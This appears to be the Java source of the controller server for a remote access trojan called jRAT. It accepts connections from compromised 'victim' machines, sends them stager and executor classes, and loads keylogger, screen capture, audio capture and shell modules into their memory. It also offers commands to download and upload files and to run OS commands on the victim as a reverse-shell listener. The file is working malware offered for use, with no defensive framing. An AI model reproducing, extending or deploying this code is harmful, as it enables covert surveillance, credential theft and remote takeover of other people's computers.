package jRAT.server;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

import jRAT.moduleHandlers.HandlerDefault;
import jRAT.moduleHandlers.HandlerModuleCore;


public class JRATServer {

    private static String PROMPT;
    private static String REMOTE_IP;
    private static int    REMOTE_PORT;

    private static boolean HANDLER_STARTED = false;
    
    private static ServerSocket serverSocket = null;

    private static final Map<String,String> officialModuleNames = new LinkedHashMap<String,String>();
    
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void main(String[] args)
    {
        /* With no arguments JavaExploitHandler
         * creates a standalone stager payload
         */
        if (args.length == 0)
        {
            JRATUtils.dumpStandalonePayload();
            return;
        }

        /* Each new module that gets implemented needs to be added
         * to this list and a label (in capital letters) assigned
         * to it through which it can be retrieved.
         */
        officialModuleNames.put("CORE",             "jRAT.modules.ModuleCore");
        officialModuleNames.put("SHELLS",           "jRAT.modules.ModuleShells");
        officialModuleNames.put("SCREEN",           "jRAT.modules.ModuleScreen");
        officialModuleNames.put("AUDIO-PLAYBACK",   "jRAT.modules.ModuleAudioPlayback");
        officialModuleNames.put("AUDIO-CAPTURE",    "jRAT.modules.ModuleAudioCapture");
        officialModuleNames.put("KEYLOGGER",        "jRAT.modules.ModuleKeylogger");
        officialModuleNames.put("HTML-PARSER",      "jRAT.modules.ModuleHTMLParser");

        /* Dependency names are stored in moduleDependencies map inside
         * the JRATDependencyHandler class and retrieved from within the
         * JAR during module loading. LinkedList is used to preserve order
         * given that some dependencies are dependent on the ones before them.
         */
        JRATDependencyHandler.initDependencyHandlerSystem();
        
        try
        {
            startHandlerInServerMode(Integer.valueOf(args[0]));
        }
        catch (Exception ex) { ex.printStackTrace(); }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static List<String> getOfficialModuleNames()
    {
        List<String> modules = new ArrayList<String>();
        for (String value : officialModuleNames.values())
        {
            /* remove leading jeh.modules. */
            modules.add(value.substring(13, value.length()));
        }
        return modules;
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void startHandlerInServerMode(int port) throws SocketException, IOException
    {
        System.out.printf("************************************************************\n");
        System.out.printf("*%-58s*\n", "");
        System.out.printf("*%-27s%s%-27s*\n","", "jRAT", "");
        System.out.printf("*%-58s*\n", "");
        System.out.printf("************************************************************\n\n");
        System.out.printf("[+] LISTENING ON PORT: %d\n", port);
        System.out.printf("[+] TRANSFER PROTOCOL: TCP\n");
        System.out.printf("[+] Waiting for connection...\n");

        serverSocket = new ServerSocket(port);

        while (true)
        {
            Socket socket             = serverSocket.accept();
            DataInputStream input     = new DataInputStream(socket.getInputStream());
            DataOutputStream output   = new DataOutputStream(socket.getOutputStream());
            String helloMessage       = input.readUTF();

            if (helloMessage.equals("HELLO"))
            {
                if (HANDLER_STARTED)
                    continue;

                Thread thread = new Thread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        try { startMainThreadHandler(socket, input, output); }
                        catch (Exception ex) {}
                    }
                });
                thread.start();
                HANDLER_STARTED = true;
            }
            else if (helloMessage.equals("STAGER-HELLO"))
            {
                Thread thread = new Thread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        sendStage(socket, input,output);
                    }
                });
                thread.start();
            }
            else
            {
                /* In this case helloMessage = name of the module
                 * for which the transfer will occur: for example
                 * ModuleShells, ModuleCore...
                 */

                /* Validating module name */
                if (!getOfficialModuleNames().contains(helloMessage))
                    continue;
                                
                /* Create and start the new data thread */
                Thread thread = new Thread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        /* There is a default data thread handler HandlerDefault that just saves
                         * the received data in the corresponding folder (named after the name
                         * of the module: ModuleCore, ModuleShells, ...), or if necessary a
                         * specialized data thread handler for the corresponding module.
                         */
                        switch (helloMessage)
                        {
                            case "ModuleCore":
                                HandlerModuleCore.startDataThreadHandler(socket, input, output, helloMessage);
                                break;
                            default:
                                HandlerDefault.startDataThreadHandler(socket, input, output, helloMessage);
                        }
                    }
                });
                thread.start(); 
            }
        }
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void startMainThreadHandler(Socket socket, DataInputStream input, DataOutputStream output)
    throws SocketException, IOException
    {
        REMOTE_IP   = socket.getInetAddress().getHostAddress();
        REMOTE_PORT = socket.getPort();

        JRATUtils.createVictimDirectories(REMOTE_IP);

        System.out.println("[+] Received connection from: " + REMOTE_IP + ":" + REMOTE_PORT + "\n");
        sendBackgroundExecutor(socket, input, output);         /* Send background executor class */
        Scanner commandInput = new Scanner(System.in);

        PROMPT = "[" + REMOTE_IP + "] >> ";
        System.out.print(PROMPT);

        /* ------------------------------------------------------------------------------------- */

        while (commandInput.hasNextLine())
        {
            String command     = commandInput.nextLine().trim();
            String testCommand = command.toUpperCase();

            if (testCommand.equals("QUIT") || testCommand.equals("EXIT"))
            {
                output.writeUTF("QUIT");
                break;
            }
            else if (testCommand.equals("MODULES"))
            {
                processModulesCommand();
            }
            else if (testCommand.equals("SHOW"))
            {
                processShowCommand(input, output, null);
            }
            else if (testCommand.startsWith("SHOW"))
            {
                final String[] commandSections = testCommand.split(" ");
                if (commandSections.length > 2)
                {
                    showHelpScreen();
                }
                else if (commandSections.length == 2)
                {
                    final String officialModuleName = officialModuleNames.get(commandSections[1]);
                    if (officialModuleName != null)             
                        processShowCommand(input, output, officialModuleName);
                    else
                        showHelpScreen();
                }
            }
            else if (testCommand.startsWith("LOAD"))
            {
                final String[] commandSections = testCommand.split(" ");
                if (commandSections.length != 2)
                {
                    showHelpScreen();
                }
                else
                {
                    final String officialModuleName = officialModuleNames.get(commandSections[1]);
                    if (officialModuleName != null)             
                        processLoadCommand(input, output, officialModuleName);
                    else
                        showHelpScreen();
                }
            }
            else if (testCommand.startsWith("UNLOAD"))
            {
                final String[] commandSections = testCommand.split(" ");
                if (commandSections.length != 2)
                {
                    showHelpScreen();
                }
                else
                {
                    final String officialModuleName = officialModuleNames.get(commandSections[1]);
                    if (officialModuleName != null)             
                        processUnloadCommand(input, output, officialModuleName);
                    else
                        showHelpScreen();
                }
            }
            else if (testCommand.startsWith("DEPS"))
            {
                processLoadedDepsCommand(input, output);
            }           
            else if (testCommand.startsWith("GET"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length != 3)
                    showHelpScreen();
                else
                    processGetCommand(input, output, commandSections[1], commandSections[2]);
            }
            else if (testCommand.startsWith("PUT"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length != 3)
                    showHelpScreen();
                else
                    processPutCommand(input, output, commandSections[1], commandSections[2]);
            }
            else if (testCommand.startsWith("RUN"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length < 3)
                {
                    showHelpScreen();
                }
                else
                {
                    final String officialModuleName = officialModuleNames.get(commandSections[1].toUpperCase());
                    if (officialModuleName != null)
                    {
                        final StringBuilder commandBuilder = new StringBuilder();
                        int tempStartIndex = command.indexOf(commandSections[1]);
                        int tempLength     = commandSections[1].length();
                        commandBuilder.append("RUN " + officialModuleName);
                        commandBuilder.append(command.substring((tempStartIndex+tempLength),command.length()));

                        switch (officialModuleName)
                        {
                            case "jeh.modules.ModuleCore":
                                HandlerModuleCore.processRunCommand(input, output, commandBuilder.toString());
                                break;
                            default:
                                HandlerDefault.processRunCommand(input, output, commandBuilder.toString());
                        }
                    }
                    else { showHelpScreen(); }
                }
            }
            else if (testCommand.equals("HELP"))
            {
                showHelpScreen();
            }
            else if (testCommand.startsWith("$"))
            {
                processLocalRunCommand(command.substring(1, command.length()));
            }
            else if (!testCommand.equals("\n"))
            {
                processRunCommand(input, output, command);
            }
            
            System.out.print(PROMPT);
        }
    
        /* ------------------------------------------------------------------------------------- */

        input.close(); output.close(); socket.close(); serverSocket.close();
        System.exit(0);
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void sendStage(Socket socket, DataInputStream input, DataOutputStream output)
    {
        try
        {
            byte[] stageBytes = JRATUtils.loadModuleBytes("/jRAT/victim/Stage.class");              
            output.writeLong(stageBytes.length);
            output.write(stageBytes);
        }
        catch (Exception ex) {}
        finally
        {
            try { input.close(); output.close(); socket.close(); }
            catch (Exception ex) {}
        }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    private static void sendBackgroundExecutor(Socket socket, DataInputStream input, DataOutputStream output)
    {
        try
        {
            byte[] stageBytes = JRATUtils.loadModuleBytes("/jRAT/victim/BackgroundExecutor.class");             
            output.writeLong(stageBytes.length);
            output.write(stageBytes);
        }
        catch (Exception ex) {}
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /*                                                      COMMANDS                                                           */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processModulesCommand()
    {
        System.out.println("*** Available modules ***");
        for (Map.Entry<String, String> entry : officialModuleNames.entrySet())
        {
            System.out.println(String.format("%-48s", entry.getKey().toLowerCase()) + " => " + entry.getValue());
        }
        System.out.println();
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processShowCommand(DataInputStream input, DataOutputStream output, String moduleName)
    {
        try
        {
            String command = "SHOW";
            if (moduleName != null)
                command = "SHOW " + moduleName;

            output.writeUTF(command);
            String responseStatus = input.readUTF();
            if (responseStatus.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response = new byte[(int)responseLength];
                    
                int numBytesRead = input.read(response);
                if (numBytesRead == -1)
                    System.out.println("[ERROR]: Something went wrong!");
                else
                    System.out.println(new String(response, "UTF-8"));
            }
            else { System.out.println(responseStatus); }
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processLoadCommand(DataInputStream input, DataOutputStream output, String moduleName)
    {
        try
        {
            output.writeUTF("LOAD " + moduleName);
            String response = input.readUTF();
            if (response.equals("SEND"))
            {
                // Sending dependencies
                // --------------------
                boolean status = JRATDependencyHandler.exchangeDependencies(input, output, moduleName);
                if (status)
                {
                    // Sending payload
                    // ---------------
                    moduleName = moduleName.replaceAll("\\.", "/");
                    byte[] moduleBytes = JRATUtils.loadModuleBytes("/" + moduleName + ".class");
                    output.writeLong(moduleBytes.length);
                    output.write(moduleBytes);
                    response = input.readUTF();
                    System.out.println(response);
                }
            }
            else if (response.equals("OK"))
                System.out.println("OK");
            else if (response.equals("HAVE"))
                System.out.println("[NOTE]: Module already loaded!");
            else
                System.out.println("[ERROR]: Something went wrong!");
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    private static void processUnloadCommand(DataInputStream input, DataOutputStream output, String moduleName)
    {
        try
        {
            output.writeUTF("UNLOAD " + moduleName);
            String responseStatus = input.readUTF();
            System.out.println(responseStatus);
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }   

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processLoadedDepsCommand(DataInputStream input, DataOutputStream output)
    {
        try
        {
            output.writeUTF("deps");
            String responseStatus = input.readUTF();
            if (responseStatus.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response     = new byte[(int)responseLength];
                input.readFully(response);
                System.out.println(new String(response, "UTF-8"));
            }
            else { System.out.println(responseStatus); }
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processGetCommand(DataInputStream input, DataOutputStream output, String remotePath, String localPath)
    {
        try
        {
            output.writeUTF("GET " + remotePath);
            String responseCode = input.readUTF();
            System.out.println(responseCode);
            if (responseCode.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response     = new byte[(int)responseLength];
                input.readFully(response);
                JRATUtils.saveBytesToFile(localPath, response);
            }       
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    private static void processPutCommand(DataInputStream input, DataOutputStream output, String localPath, String remotePath)
    {
        try
        {
            final byte[] rawFileBytes = JRATUtils.readBytesFromFile(localPath);
            if (rawFileBytes != null && rawFileBytes.length > 0)
            {
                output.writeUTF("PUT " + remotePath);
                output.writeLong(rawFileBytes.length);
                output.write(rawFileBytes);
                output.flush();

                String responseStatus = input.readUTF();
                System.out.println(responseStatus);
            }
            else { System.out.println("[ERROR]: Something went wrong!");  }         
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processRunCommand(DataInputStream input, DataOutputStream output, String command)
    {
        try
        {
            output.writeUTF(command);
            String responseStatus = input.readUTF();
            if (responseStatus.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response = new byte[(int)responseLength];

                input.readFully(response);
                System.out.println(new String(response, "UTF-8"));
            }
            else { System.out.println(responseStatus); }
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }      
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void processLocalRunCommand(String command)
    {
        BufferedReader processInputStream = null;
        BufferedReader processErrorStream = null;
        try
        {
            final Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            processInputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
            processErrorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String currentLine;
            while ((currentLine = processInputStream.readLine()) != null)
                System.out.println(currentLine);
            while ((currentLine = processErrorStream.readLine()) != null)
                System.out.println(currentLine);
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }
        finally
        {
            try
            {
                if (processInputStream != null)
                    processInputStream.close();
                if (processErrorStream != null)
                    processErrorStream.close();
            }
            catch (Exception ex) {}
        }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void showHelpScreen()
    {
        System.out.printf("\n*** COMMAND LIST ***\n\n");
        System.out.printf("%-45s%s\n", "quit",                                      "=> Exits the program");
        System.out.printf("%-45s%s\n", "exit",                                      "=> Exits the program");
        System.out.printf("%-45s%s\n", "help",                                      "=> Displays the help screen");     
        System.out.printf("%-45s%s\n", "modules",                                   "=> Displays the list of possible modules");        
        System.out.printf("%-45s%s\n", "show",                                      "=> Shows definitions of all the methods for all the loaded modules");
        System.out.printf("%-45s%s\n", "show MODULE_NAME",                          "=> Shows definitions of all the methods for the specified loaded module");
        System.out.printf("%-45s%s\n", "load MODULE_NAME",                          "=> Loads the specified module into the memory of the victim machine");
        System.out.printf("%-45s%s\n", "unload MODULE_NAME",                        "=> Unloads the specified module from the memory of the victim machine");       
        System.out.printf("%-45s%s\n", "deps",                                      "=> Shows a list of loaded dependencies for all the loaded modules");
        System.out.printf("%-45s%s\n", "get REMOTE_PATH LOCAL_PATH",                "=> Downloads the file from the remote machine");
        System.out.printf("%-45s%s\n", "put LOCAL_PATH REMOTE_PATH",                "=> Uploads the file to the remote machine");
        System.out.printf("%-45s%s\n", "run MODULE_NAME METHOD_NAME ARG1 ARG2 ...", "=> Runs the method from the specified module");        
        System.out.printf("\n");
        System.out.printf("%-45s%s\n", "command",                                   "=> Runs the specified OS command on the victim machine.");
        System.out.printf("%-48s%s\n", "",                                          "Without any of the keywords above the server simply works as a reverse");
        System.out.printf("%-48s%s\n", "",                                          "shell listener and can be used to execute standard shell commands");       
        System.out.print("\n");
        System.out.printf("%-45s%s\n", "$command",                                  "=> Runs the specified OS command on the local machine.");
        System.out.print("\n");     
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static String getRemoteIP() { return REMOTE_IP; }
}
